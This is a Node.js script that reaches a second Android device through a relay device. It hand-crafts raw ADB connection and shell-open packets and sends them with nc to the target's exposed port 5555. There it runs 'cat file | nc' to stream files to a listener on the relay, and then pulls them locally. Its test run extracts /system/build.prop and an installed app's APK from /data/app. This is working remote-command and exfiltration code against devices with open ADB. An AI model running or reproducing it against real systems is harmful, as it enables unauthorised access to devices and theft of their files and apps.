#!/usr/bin/env node
/**
 * Pull a file from .220 via D1 nc relay using two concurrent adb shell sessions.
 * Session 1: nc listener on D1 (long-running)
 * Session 2: trigger .220 to cat file | nc to D1
 * Then adb pull from D1 to local.
 */

const { spawn, execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const D1 = 'localhost:8479';
const D1_IP = '10.0.96.174';
const SRC = '10.0.26.220';

function buildOpen(cmd) {
  const p = Buffer.from('shell:' + cmd + '\x00');
  const h = Buffer.alloc(24);
  h.writeUInt32LE(0x4e45504f, 0); h.writeUInt32LE(1, 4); h.writeUInt32LE(0, 8);
  h.writeUInt32LE(p.length, 12);
  let c = 0; for (const b of p) c += b;
  h.writeUInt32LE(c >>> 0, 16);
  h.writeUInt32LE((0x4e45504f ^ 0xFFFFFFFF) >>> 0, 20);
  return Buffer.concat([h, p]);
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function relayPull(remoteFile, localFile, port, timeoutSec) {
  timeoutSec = timeoutSec || 180;

  // Prepare OPEN packet for .220
  const cmd220 = `cat "${remoteFile}" | nc -w ${timeoutSec} ${D1_IP} ${port} 2>/dev/null; echo XFER_DONE`;
  const open = buildOpen(cmd220);
  fs.writeFileSync('/tmp/adb_open_relay.bin', open);
  execSync(`adb -s ${D1} push /tmp/adb_open_relay.bin /sdcard/open_relay.bin 2>/dev/null`);

  // Clean up old file
  try { execSync(`adb -s ${D1} shell rm -f /sdcard/recv_file.bin 2>/dev/null`); } catch(e) {}

  return new Promise((resolve) => {
    let listenerDone = false;
    let senderDone = false;
    let timer;

    // Session 1: nc listener on D1 (stays alive until data received or timeout)
    const listener = spawn('adb', ['-s', D1, 'shell',
      `nc -l -p ${port} -w ${timeoutSec} > /sdcard/recv_file.bin; echo LISTENER_SIZE=$(wc -c < /sdcard/recv_file.bin)`
    ]);

    let listenerOut = '';
    listener.stdout.on('data', d => { listenerOut += d.toString(); });
    listener.stderr.on('data', d => { /* ignore */ });
    listener.on('close', () => {
      listenerDone = true;
      console.log('  Listener finished:', listenerOut.trim());
      finish();
    });

    // Wait 2 seconds for listener to be ready, then send trigger
    setTimeout(() => {
      console.log('  Triggering .220 file transfer...');
      // Session 2: send ADB packets to .220 to trigger cat|nc
      const sender = spawn('adb', ['-s', D1, 'shell',
        `(cat /sdcard/cnxn.bin; sleep 0.5; cat /sdcard/open_relay.bin; sleep ${Math.min(timeoutSec, 300)}) | nc -w ${Math.min(timeoutSec + 5, 305)} ${SRC} 5555 > /dev/null 2>&1; echo SENDER_DONE`
      ]);

      let senderOut = '';
      sender.stdout.on('data', d => { senderOut += d.toString(); });
      sender.on('close', () => {
        senderDone = true;
        finish();
      });
    }, 2000);

    // Overall timeout
    timer = setTimeout(() => {
      console.log('  Overall timeout reached');
      listener.kill();
      finish();
    }, (timeoutSec + 30) * 1000);

    function finish() {
      if (!listenerDone) return; // Wait for listener
      clearTimeout(timer);

      // Pull file from D1
      try {
        const sizeStr = execSync(`adb -s ${D1} shell wc -c < /sdcard/recv_file.bin 2>/dev/null`, {
          timeout: 5000, encoding: 'utf8'
        }).trim();
        const size = parseInt(sizeStr) || 0;
        console.log(`  D1 received: ${size} bytes`);

        if (size > 0) {
          execSync(`adb -s ${D1} pull /sdcard/recv_file.bin "${localFile}" 2>/dev/null`, { timeout: 120000 });
          execSync(`adb -s ${D1} shell rm -f /sdcard/recv_file.bin 2>/dev/null`);
          resolve(size);
        } else {
          resolve(0);
        }
      } catch (e) {
        console.log('  Pull error:', e.message.slice(0, 80));
        resolve(-1);
      }
    }
  });
}

// ── Main: test with build.prop first, then an APK ──
async function main() {
  // Ensure cnxn.bin on D1
  const cnxn = Buffer.from('434e584e00000001001000000700000032020000bcb1a7b1686f73743a3a00', 'hex');
  fs.writeFileSync('/tmp/adb_cnxn.bin', cnxn);
  execSync(`adb -s ${D1} push /tmp/adb_cnxn.bin /sdcard/cnxn.bin 2>/dev/null`);

  // Test 1: small file
  console.log('Test 1: /system/build.prop');
  const s1 = await relayPull('/system/build.prop', '/tmp/test_build.prop', 33800, 30);
  console.log(`Result: ${s1} bytes`);
  if (s1 > 0) {
    console.log('Content preview:', fs.readFileSync('/tmp/test_build.prop', 'utf8').slice(0, 200));
  }

  if (s1 > 0) {
    // Test 2: small APK (com.app.trademo ~8.3MB)
    console.log('\nTest 2: com.app.trademo APK (8.3MB)');
    const s2 = await relayPull(
      '/data/app/~~Wxk7-55Bxuh7YZnn2ZFEiA==/com.app.trademo-5zyYOz2-ozsLRT0GbiAuSQ==/base.apk',
      '/tmp/test_trademo.apk',
      33801, 60
    );
    console.log(`Result: ${s2} bytes`);
  }
}

main().catch(e => console.error(e));
